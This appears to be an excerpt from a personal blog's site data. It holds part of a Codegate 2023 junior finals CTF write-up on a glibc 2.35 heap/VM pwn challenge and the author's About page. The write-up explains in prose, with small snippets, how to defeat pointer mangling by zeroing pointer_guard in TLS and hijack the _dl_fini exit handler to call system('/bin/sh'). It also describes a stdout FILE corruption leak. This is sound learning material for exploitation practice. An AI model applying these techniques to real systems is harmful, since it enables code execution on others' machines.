execute instruction 10 more. But the problem is for that to work you have to leak libc,pie,and stack, which is ultimately what we can\u0026rsquo;t do, and is trying to do.\nSo you essentially can\u0026rsquo;t move to other sections of memory (like stack, heap, .data etc) since you would need 2 leaks to do that, and can only move around libc memory.\nAt first I tried the naive idea of overwriting the vtable pointer of the stdout FILE structure in libc (_IO_2_1_stdout_), by leaking a libc address, calculating the address of system, and making my own vtable at the default location of room (where room was initially at in the beginning). But this exploit didn\u0026rsquo;t work, and instead printed out\nFatal error: glibc detected an invalid stdio handle\nas there was a mitigation applied after glibc 2.24, that checks the address of vtable before any virtual functions are called.\nI tried googling around and looking for ways to bypass this, and found some writeups, one of which being this. But all the writeups seemed quite old, I quickly scrolled through them and I didn\u0026rsquo;t really have much faith on them working on glibc 2.35.\nSo I went back to square one and kept thinking of other exploitation ideas.\nAbusing exit handlers I actually first thought about abusing exit handlers after I finished analysing the binary since I explored the technique quite recently. But I thought that that idea wasn\u0026rsquo;t possible since exit() wasn\u0026rsquo;t called, and I quickly dismissed the idea.\nAfter failing to do the vtable overwrite however, I revisited this idea, and wondered whether exit was still called by libc after main returned, and guess what, exit was indeed called.\nIf you\u0026rsquo;re not familliar with this technique, I recommend reading this article\nEssentially exit() is just a wrapper function for:\n__run_exit_handlers (status, \u0026amp;__exit_funcs, true, true);\nAnd in libc memory, there is a variable called __exit_funcs, which is an exit_function_list structure. __exit_funcs points to the head of a linked list, that contains multiple exit_function objects. (One linked list element has multiple exit_function objects, when more exit_function objects are required, another linked list element will be created).\nWhen __run_exit_handlers(\u0026hellip;) is called, all the function pointers in the exit_function objects will be called. There are multiple flavors/types of exit_function objects that are all treated slightly differently by __run_exit_handlers(\u0026hellip;), (I recommend reading the article to learn more), but the flavor we\u0026rsquo;re gonna look into is the cxa flavor.\nThis is because by default, there will be already an exit_function object registered in the list, which contains the function pointer of _dl_fini(), and that exit_function object is of the flavor cxa.\nIn the libc source code, the definition of the cxa exit_function struct is\nstruct exit_function { long int flavor; ... // I redacted a lot of parts for simplicity, read the article for clearer full view struct { void (*fn) (void *arg, int status); void *arg; void *dso_handle; } cxa; ... }; In memory, everything looks something like:\n0x7ffff7fac838 \u0026lt;__exit_funcs\u0026gt;: 0x00007ffff7fadf00 ... 0x00007ffff7fadf00 │+0x0000: 0x0000000000000000 0x00007ffff7fadf08 │+0x0008: 0x0000000000000001 0x00007ffff7fadf10 │+0x0010: 0x0000000000000004 - 0x00007ffff7fadf18 │+0x0018: 0x93b315d57adee436 |--- one exit_function object 0x00007ffff7fadf20 │+0x0020: 0x0000000000000000 | 0x00007ffff7fadf28 │+0x0028: 0x0000000000000000 - 0x00007ffff7fadf30 │+0x0030: 0x0000000000000000 As you can see, the _dl_fini function pointer is mangled, this is a mitigation by libc to prevent exit handlers being so easily abused.\nThe mangling is essentially done with:\n// let rdx = function xor rdx,QWORD PTR fs:0x30 rol rdx,0x11 What\u0026rsquo;s inside fs:0x30 is called the pointer_guard, which is just 16 random bytes.\nWhen I was reading the article, I questioned what was the fs register used for, and what it was pointing at. A quick google search showed me this, which said that the fs register is used to point at the TLS (Thread Local Storage), which I assume is to store thread information.\nBack to the challange What I could do is just overwrite the _dl_fini exit_function object, with the mangled address of system, and an address to /bin/sh underneath it. But the question is, how can I mangle the address of system?\nHow the article defeated pointer mangling was by leaking the mangled _dl_fini address, and doing\nptr_guard = ror(ptr_encoded, 0x11, 64) ^ _dl_fini # this works because # _dl_fini = ror(mangled_ptr) ^ ptr_guard # ptr_guard = _dl_fini ^ ror(mangled_ptr) However for this to work, you would need two leaks, one to leak libc, one to leak the mangled_ptr. Thankfully when I was reading through @nobodyisnobody\u0026rsquo;s writeup collection, I came across this writeup, which defeated the pointer_guard by overwriting it in the TLS.\nshoutout to @nobodyisnobody btw, I\u0026rsquo;ve learned quite a bit of stuff from his writeups\nHowever when I first read this writeup before the ctf, I tried to explore this idea by finding where the TLS is in gdb to look at the object, but everytime I tried to view the fs register\ngef➤ print $fs $1 = 0x0 I revisited this idea during the ctf, and thankfully I came across this writeup, which printed out the fs register in gdb using\ngef➤ print $fs_base $1 = 0x7ffff7d90740 The TLS is in libc memory! So now I can calculate the constant offset from libc base to TLS, and overwrite the pointer_guard to 0. Then I overwrote the mangled _dl_fini address into rol(system,0x11,64), and then wrote the default address of room right underneath it, and put the \u0026ldquo;/bin/sh\u0026rdquo; string at the default location of room.\nExploit worked, and shell popped. Gg.\nMinor inconveniences atoll() is used in the vm\u0026rsquo;s instructions when loading numbers into the reg, so the maximum number you could load was 0x7fffffffffffffff since a signed long is read. This was a problem when I was writing the rol(system), as the addresses were generally \u0026gt; 0x7fffffffffffffff. I got around this by using two writes to write the rol(system) addres. After the ctf, I talked to @samuzora, and he had the idea to just use negative numbers to do the write, which is a much cleaner approach compared to mine.\nMy exploit worked locally, but kept failing remotely. I kept getting:\ntimeout: the monitored command dumped core /home/ctf/run.sh: line 2: 573 Illegal instruction timeout 60 /home/ctf/goblin_vm I contacted the organizers and they said that the chall had no problems.\nI investigated it using a docker container, and it seems like my libc leaks were inconsistent. Iirc, I was leaking libc addresses from the region at around libc_base+0x219000. I changed my exploit to leak from the default vtable of libc. So note to self, don\u0026rsquo;t leak random libc addresses found in libc next time, leak libc function symbols instead.\nAnother approach I also talked to @pepsipu after the ctf, and he actually solved this chall by overwriting the stdout FILE structure. What he did was enable full buffering on by overwriting the FILE object flags with Or(default flags,0x1800), which tells the stdout object to dump its buffer before printing. He then pops the IO_write_end pointer to reg, add it with 0x7000, then overwrote the IO_write_end pointer with the new value. This will make the IO object to believe the end of the buffer is much further than it actually is.\nWhen printf is called, the IO object will flush the buffer and print out everything between IO_write_base and IO_write_end, and thus leaking everything you\u0026rsquo;ll ever need.\nHe then just does a simple ret2libc to get shell.\nCool technique.\nConclusion This was my first ever irl ctf event, and I enjoyed it very much. I met tons of cool skilled people, and got a few cool stickers too. I strongly believe that this is the first to many irl ctfs, and I\u0026rsquo;ll work hard to get stronger and more skillful to make this true.\nThanks to the organizers for holding such a great event, and I hope I can go to more onsite finals soon and meet more cool people soon.\nepicHaxorl337swag!1! ","permalink":"https://zhirenliew.github.io/posts/codegate_finals23/","summary":"my experience at codegate 2023 finals, and writeups for junior challs","title":"Codegate Finals 2023 (Juniors)"},{"content":"Hi, I\u0026rsquo;m zhiren 🇲🇾, and I\u0026rsquo;m very passionate about technology.\nI\u0026rsquo;m interested in mechatronics, computers, automotives, and more.\nI\u0026rsquo;m curious, and like to learn how things work under the hood.\nI was also an active ctf player, mainly focusing on binary exploitation.\nNowadays, I\u0026rsquo;m spending most of my time building things.\nProjects AES Messenger: Terminal messaging app that encrypts user messages using AES. nand2tetris: Did an applied computer science course called nand2tetris, and built a computer from scratch. Experiences ctfs achievements in ctfs that I played in and contributed\n2023 [solo] 8th in CODEGATE junior finals @ Seoul, South Korea [thehackerscrew] 11th in ISITDTU CTF finals @ Da Nang, Vietnam [thehackerscrew] 5th in Imaginary CTF [solo] 10th in Wargames.MY CTF (professional) 2024 [thehackerscrew] 4th in LakeCTF finals @ EPFL, Lausanne, Switzerland [Kopi Cincau] 12th in HackTheOn Finals (Advanced) @ Sejong-si, South Korea [Copi Kincau] 3rd in ASEAN Cyber Shield @ Ha Long Bay, Vietnam others Global Cybersecurity Camp 2024 (GCC) @ Chon Buri, Thailand Gave a talk about pwn 101 for RE:HACK\u0026rsquo;s Level-Up Event @ IIUM, Gombak, Malaysia top 150 on pwnable.tw (last checked Jun 2024) ","permalink":"https://zhirenliew.github.io/about/","summary":"about","title":"刘智仁"}]